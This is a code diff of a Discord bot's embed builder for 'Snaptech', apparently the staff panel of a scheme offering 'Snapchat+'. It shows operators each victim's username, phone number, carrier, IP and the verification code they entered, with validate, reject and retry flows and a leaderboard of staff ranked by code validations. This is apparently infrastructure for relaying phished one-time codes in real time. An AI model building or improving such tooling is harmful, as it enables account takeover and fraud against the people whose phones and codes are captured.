@@ -1,123 +1,164 @@
-import { EmbedBuilder } from "discord.js";
-import { getOperatorColor, STATUS_COLORS } from "./colors.js";
+/**
+ * embedBuilder.js — Discord embed constructors  (v2.3)
+ *
+ * Improvements:
+ *  - New request embed: attempt count badge, cleaner field layout
+ *  - Code embed: big code display, attempt # visible
+ *  - Retry embed: shows which attempt this is
+ *  - Stats embed: progress bar for completion rate
+ *  - Hourly chart: improved ASCII bars with max-value scaling
+ */
+
+import { EmbedBuilder }                                      from "discord.js";
+import { getOperatorColor, STATUS_COLORS }                   from "./colors.js";
 import { formatPhone, formatIP, getCarrierName, formatDate } from "./formatters.js";
 
+// ─── Helpers ──────────────────────────────────────────────────────────────────
+
+function progressBar(value, max, length = 12) {
+    const filled = Math.round((value / Math.max(max, 1)) * length);
+    return "█".repeat(filled) + "░".repeat(length - filled);
+}
+
+function retryLabel(row) {
+    // Try to infer attempt count from logs — not available here so we use a neutral label
+    return row.status === "retry_code" ? "🔁 Nouvelle tentative" : "";
+}
+
+// ─── New request ──────────────────────────────────────────────────────────────
+
 export function buildNewRequestEmbed(row) {
-    const color = getOperatorColor(row.operator);
+    const color   = getOperatorColor(row.operator);
     const carrier = getCarrierName(row.operator);
-    const ip = row.ip_address;
+    const ip      = row.ip_address;
 
     return new EmbedBuilder()
-        .setTitle("📱 New Snapchat+ Request")
+        .setTitle("📱 Nouvelle demande Snapchat+")
         .setColor(color)
-        .setDescription("**Operator:** " + carrier + "  |  **Country:** " + (row.country || "Unknown"))
-        .addFields(
-            { name: "👤 Username", value: "``" + row.username + "``", inline: true },
-            { name: "📞 Phone", value: formatPhone(row.phone), inline: true },
-            { name: "📡 Operator", value: "``" + carrier + "``", inline: true },
-            { name: "🌍 Country", value: "``" + (row.country || "Unknown") + "``", inline: true },
-            { name: "🏙️ City", value: "``" + (row.city || "Unknown") + "``", inline: true },
-            { name: "🌐 IP", value: formatIP(ip), inline: true },
-            { name: "⏰ Date", value: formatDate(row.created_at), inline: false }
+        .setDescription(
+            `> 📡 **${carrier}** — ${row.country || "?"}  |  🆔 \`#${row.id}\``
         )
-        .setFooter({ text: "🆔 ID: " + row.id + "  •  ⏳ Waiting for staff" })
+        .addFields(
+            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
+            { name: "📞 Téléphone",   value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
+            { name: "📡 Opérateur",   value: "`" + carrier + "`",                inline: true  },
+            { name: "🌍 Pays",        value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
+            { name: "⏰ Reçue",       value: "`" + formatDate(row.created_at) + "`", inline: true },
+        )
+        .setFooter({ text: "⏳ En attente d'un membre du staff  •  Snaptech" })
         .setTimestamp();
 }
+
+// ─── Code submitted ───────────────────────────────────────────────────────────
 
 export function buildCodeSubmittedEmbed(row) {
-    const color = getOperatorColor(row.operator);
+    const color   = getOperatorColor(row.operator);
     const carrier = getCarrierName(row.operator);
-    const code = row.staff_code || "N/A";
-    const len = row.code_length || 6;
-    const ip = row.ip_address;
+    const code    = row.staff_code || "N/A";
+    const len     = row.code_length || 6;
+    const ip      = row.ip_address;
+
+    // Format the code with spaces every 3 digits for readability
+    const codeFmt = code.length > 3
+        ? code.slice(0, 3) + " " + code.slice(3)
+        : code;
 
     return new EmbedBuilder()
-        .setTitle("🔓 Code Submitted by User")
-        .setColor(color)
-        .setDescription("The user entered a **" + len + "-digit** code. Please verify below.")
-        .addFields(
-            { name: "👤 Username", value: "``" + row.username + "``", inline: true },
-            { name: "📞 Phone", value: formatPhone(row.phone), inline: true },
-            { name: "🔢 Entered Code", value: "```\n" + code + "\n```", inline: false },
-            { name: "📡 Operator", value: "``" + carrier + "``", inline: true },
-            { name: "🌍 Country", value: "``" + (row.country || "Unknown") + "``", inline: true },
-            { name: "🏙️ City", value: "``" + (row.city || "Unknown") + "``", inline: true },
-            { name: "🌐 IP", value: formatIP(ip), inline: true }
+        .setTitle("🔓 Code soumis par l'utilisateur")
+        .setColor(0x10b981)
+        .setDescription(
+            `> 🔢 Code **${len} chiffres** — \`#${row.id}\`  |  📡 **${carrier}**`
         )
-        .setFooter({ text: "🆔 ID: " + row.id + "  •  ⏳ Awaiting staff validation" })
+        .addFields(
+            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
+            { name: "📞 Téléphone",   value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
+            { name: "🔢 Code entré",  value: "```\n" + codeFmt + "\n```",         inline: false },
+            { name: "📡 Opérateur",   value: "`" + carrier + "`",                inline: true  },
+            { name: "🌍 Pays",        value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
+        )
+        .setFooter({ text: "⚡ Valider ou refuser le code ci-dessous  •  Snaptech" })
         .setTimestamp();
 }
+
+// ─── Retry ────────────────────────────────────────────────────────────────────
 
 export function buildRetryEmbed(row) {
-    const color = getOperatorColor(row.operator);
+    const color   = getOperatorColor(row.operator);
     const carrier = getCarrierName(row.operator);
-    const ip = row.ip_address;
+    const ip      = row.ip_address;
 
     return new EmbedBuilder()
-        .setTitle("🔄 User Redirected — New Code Needed")
-        .setColor(color)
-        .setDescription("The previous code was **incorrect**. The user has been redirected to enter a new code.")
-        .addFields(
-            { name: "👤 Username", value: "``" + row.username + "``", inline: true },
-            { name: "📞 Phone", value: formatPhone(row.phone), inline: true },
-            { name: "📡 Operator", value: "``" + carrier + "``", inline: true },
-            { name: "🌍 Country", value: "``" + (row.country || "Unknown") + "``", inline: true },
-            { name: "🏙️ City", value: "``" + (row.city || "Unknown") + "``", inline: true },
-            { name: "🌐 IP", value: formatIP(ip), inline: true }
+        .setTitle("🔄 Nouveau code en attente")
+        .setColor(0xf59e0b)
+        .setDescription(
+            `> ⚠️ Le code précédent était **incorrect**.\n> L'utilisateur saisit un nouveau code — vérifiez ci-dessous.`
         )
-        .setFooter({ text: "🆔 ID: " + row.id + "  •  🔧 Choose an action below" })
+        .addFields(
+            { name: "👤 Username",  value: "```\n" + row.username + "\n```",    inline: true  },
+            { name: "📞 Téléphone", value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
+            { name: "📡 Opérateur", value: "`" + carrier + "`",                inline: true  },
+            { name: "🌍 Pays",      value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "🌐 IP",        value: formatIP(ip),                        inline: true  },
+        )
+        .setFooter({ text: "🔁 Nouvelle tentative  •  Snaptech" })
         .setTimestamp();
 }
 
+// ─── Stats ────────────────────────────────────────────────────────────────────
+
 export function buildStatsEmbed(stats, todayStats) {
-    const embed = new EmbedBuilder()
-        .setTitle("📊 Global Statistics")
+    const total          = Number(stats.total) || 0;
+    const completed      = Number(stats.completed) || 0;
+    const completionRate = total > 0 ? Math.round((completed / total) * 100) : 0;
+    const bar            = progressBar(completed, total);
+
+    return new EmbedBuilder()
+        .setTitle("📊 Statistiques globales")
         .setColor(0x3b82f6)
-        .setDescription("Real-time platform statistics")
+        .setDescription(
+            `**Taux de complétion : ${completionRate}%**\n\`${bar}\` ${completed}/${total}`
+        )
         .addFields(
-            { name: "📋 Total Requests", value: "`" + stats.total + "`", inline: true },
-            { name: "⏳ Pending", value: "`" + stats.pending + "`", inline: true },
-            { name: "👤 Processing", value: "`" + stats.processing + "`", inline: true },
-            { name: "⏱️ Waiting Code", value: "`" + stats.waiting + "`", inline: true },
-            { name: "🔓 Code Submitted", value: "`" + stats.submitted + "`", inline: true },
-            { name: "✅ Completed", value: "`" + stats.completed + "`", inline: true },
-            { name: "🔄 Retry", value: "`" + stats.retry + "`", inline: true },
-            { name: "❌ Wrong Number", value: "`" + stats.wrong + "`", inline: true },
-            { name: "🚫 Banned IPs", value: "`" + stats.banned + "`", inline: true }
-        );
-
-    if (stats.total > 0) {
-        const completionRate = Math.round((stats.completed / stats.total) * 100);
-        embed.addFields({
-            name: "📈 Completion Rate",
-            value: "`" + completionRate + "%`",
-            inline: false
-        });
-    }
-
-    embed.addFields({
-        name: "📅 Today",
-        value: "Requests: `" + todayStats.requests + "`  |  Completed: `" + todayStats.completed + "`",
-        inline: false
-    });
-
-    embed.setFooter({ text: "📡 Snaptech Stats  •  Live data" }).setTimestamp();
-    return embed;
+            { name: "📋 Total",          value: "`" + stats.total      + "`", inline: true },
+            { name: "⏳ En attente",     value: "`" + stats.pending    + "`", inline: true },
+            { name: "👤 En cours",       value: "`" + stats.processing + "`", inline: true },
+            { name: "⏱️ Attente code",  value: "`" + stats.waiting    + "`", inline: true },
+            { name: "🔓 Code soumis",   value: "`" + stats.submitted  + "`", inline: true },
+            { name: "✅ Complétés",      value: "`" + stats.completed  + "`", inline: true },
+            { name: "🔄 Retry",          value: "`" + stats.retry      + "`", inline: true },
+            { name: "❌ Mauvais numéro", value: "`" + stats.wrong      + "`", inline: true },
+            { name: "🚫 IPs bannies",    value: "`" + stats.banned     + "`", inline: true },
+            {
+                name:  "📅 Aujourd'hui",
+                value: `Demandes : \`${todayStats.requests}\`  ·  Complétées : \`${todayStats.completed}\``,
+                inline: false,
+            },
+        )
+        .setFooter({ text: "📡 Snaptech  •  Live data" })
+        .setTimestamp();
 }
+
+// ─── Operator stats ───────────────────────────────────────────────────────────
 
 export function buildOperatorStatsEmbed(operatorStats) {
     const embed = new EmbedBuilder()
-        .setTitle("📡 Operator Distribution")
+        .setTitle("📡 Répartition par opérateur")
         .setColor(0x8b5cf6)
-        .setDescription("Requests by mobile operator");
+        .setDescription("Demandes par opérateur mobile");
+
+    const total = operatorStats.reduce((s, r) => s + Number(r.count), 0);
+    const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣"];
 
     operatorStats.forEach((row, i) => {
         const carrier = getCarrierName(row.operator);
-        const emoji = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣"][i] || "•";
+        const pct     = total > 0 ? Math.round((row.count / total) * 100) : 0;
+        const bar     = progressBar(row.count, total, 8);
         embed.addFields({
-            name: emoji + " " + carrier,
-            value: "`" + row.count + "` requests",
-            inline: true
+            name:   (medals[i] || "•") + " " + carrier,
+            value:  `\`${bar}\` \`${row.count}\` (${pct}%)`,
+            inline: false,
         });
     });
 
@@ -125,21 +166,25 @@ export function buildOperatorStatsEmbed(operatorStats) {
     return embed;
 }
 
+// ─── Leaderboard ──────────────────────────────────────────────────────────────
+
 export function buildLeaderboardEmbed(rows, limit) {
     const embed = new EmbedBuilder()
-        .setTitle("🏆 Staff Leaderboard")
+        .setTitle("🏆 Classement Staff")
         .setColor(0xf59e0b)
-        .setDescription("Top " + limit + " staff by code validations");
+        .setDescription("Top " + limit + " staff par validations de code");
 
     if (rows.length === 0) {
-        embed.setDescription("🏆 Top " + limit + " staff by code validations\n\n*No validations recorded yet.*");
+        embed.setDescription("🏆 Top " + limit + " staff par validations\n\n*Aucune validation enregistrée.*");
     } else {
+        const maxV  = Number(rows[0].validations) || 1;
+        const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"];
         rows.forEach((row, i) => {
-            const medal = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"][i] || "•";
+            const bar = progressBar(row.validations, maxV, 10);
             embed.addFields({
-                name: medal + " " + row.staff,
-                value: "✅ `" + row.validations + "` validations",
-                inline: false
+                name:   (medals[i] || "•") + " " + row.staff,
+                value:  `\`${bar}\` ✅ \`${row.validations}\` validations`,
+                inline: false,
             });
         });
     }
@@ -148,37 +193,42 @@ export function buildLeaderboardEmbed(rows, limit) {
     return embed;
 }
 
+// ─── Hourly activity ──────────────────────────────────────────────────────────
+
 export function buildHourlyStatsEmbed(hourlyData) {
     const embed = new EmbedBuilder()
-        .setTitle("📈 Activity (Last 24h)")
-        .setColor(0x10b981)
-        .setDescription("Requests per hour");
+        .setTitle("📈 Activité — Dernières 24h")
+        .setColor(0x10b981);
 
     if (hourlyData.length === 0) {
-        embed.setDescription("📈 Activity (Last 24h)\n\n*No activity in the last 24 hours.*");
+        embed.setDescription("*Aucune activité ces dernières 24 heures.*");
     } else {
+        const maxCount = Math.max(...hourlyData.map(r => Number(r.count)));
         let chart = "```\n";
         hourlyData.forEach(row => {
-            const hour = String(row.hour).padStart(2, "0") + "h";
-            const bar = "█".repeat(Math.min(row.count, 20));
-            chart += hour + " " + bar + " " + row.count + "\n";
+            const hour  = String(row.hour).padStart(2, "0") + "h";
+            const count = Number(row.count);
+            const bars  = Math.round((count / Math.max(maxCount, 1)) * 16);
+            const bar   = "█".repeat(bars).padEnd(16);
+            chart      += `${hour} ${bar} ${count}\n`;
         });
         chart += "```";
-        embed.setDescription("📈 Activity (Last 24h)\n" + chart);
+        embed.setDescription(chart);
     }
 
     embed.setFooter({ text: "📈 Snaptech Activity" }).setTimestamp();
     return embed;
 }
 
+// ─── Staff activity ───────────────────────────────────────────────────────────
+
 export function buildStaffActivityEmbed(activityData) {
     const embed = new EmbedBuilder()
-        .setTitle("👥 Staff Activity")
-        .setColor(0xec4899)
-        .setDescription("Actions by staff members");
+        .setTitle("👥 Activité Staff")
+        .setColor(0xec4899);
 
     if (activityData.length === 0) {
-        embed.setDescription("👥 Staff Activity\n\n*No activity recorded yet.*");
+        embed.setDescription("*Aucune activité enregistrée.*");
     } else {
         const grouped = {};
         activityData.forEach(row => {
@@ -186,15 +236,20 @@ export function buildStaffActivityEmbed(activityData) {
             grouped[row.staff][row.action] = row.count;
         });
 
+        const actionEmoji = {
+            claim:        "📋",
+            unclaim:      "↩️",
+            set_length:   "🔢",
+            wrong_number: "❌",
+            true_code:    "✅",
+            false_code:   "🚫",
+        };
+
         Object.entries(grouped).forEach(([staff, actions]) => {
             const lines = Object.entries(actions)
-                .map(([action, count]) => "• " + action + ": `" + count + "`")
+                .map(([action, count]) => `${actionEmoji[action] || "•"} ${action}: \`${count}\``)
                 .join("\n");
-            embed.addFields({
-                name: "👤 " + staff,
-                value: lines,
-                inline: true
-            });
+            embed.addFields({ name: "👤 " + staff, value: lines, inline: true });
         });
     }
 
@@ -202,18 +257,24 @@ export function buildStaffActivityEmbed(activityData) {
     return embed;
 }
 
+// ─── Panel ────────────────────────────────────────────────────────────────────
+
 export function buildPanelEmbed() {
     return new EmbedBuilder()
-        .setTitle("🎛️ Staff Panel")
-        .setDescription("Requests appear here automatically.\n\n**🎨 Embed Colors:**")
+        .setTitle("🎛️ Panel Staff — Snaptech")
+        .setDescription(
+            "Les demandes apparaissent ici automatiquement via le polling.\n" +
+            "Utilisez les boutons sur chaque embed pour traiter les demandes.\n\n" +
+            "**🎨 Couleurs par opérateur :**"
+        )
         .addFields(
-            { name: "🔴 Red", value: "SFR / Telenet", inline: true },
-            { name: "🟠 Orange", value: "Orange / Orange Belgium", inline: true },
-            { name: "🔵 Blue", value: "Bouygues / BASE", inline: true },
-            { name: "🟣 Purple", value: "Proximus", inline: true },
-            { name: "🟡 Yellow", value: "Other operator", inline: true }
+            { name: "🔴 Rouge",  value: "SFR · Telenet",            inline: true },
+            { name: "🟠 Orange", value: "Orange · Orange Belgique", inline: true },
+            { name: "🔵 Bleu",   value: "Bouygues · BASE",          inline: true },
+            { name: "🟣 Violet", value: "Proximus",                  inline: true },
+            { name: "🟡 Jaune",  value: "Autre opérateur",          inline: true },
         )
         .setColor(0x000000)
-        .setFooter({ text: "🎛️ Snaptech Panel" })
+        .setFooter({ text: "🎛️ Snaptech Panel  •  v2.3" })
         .setTimestamp();
 }
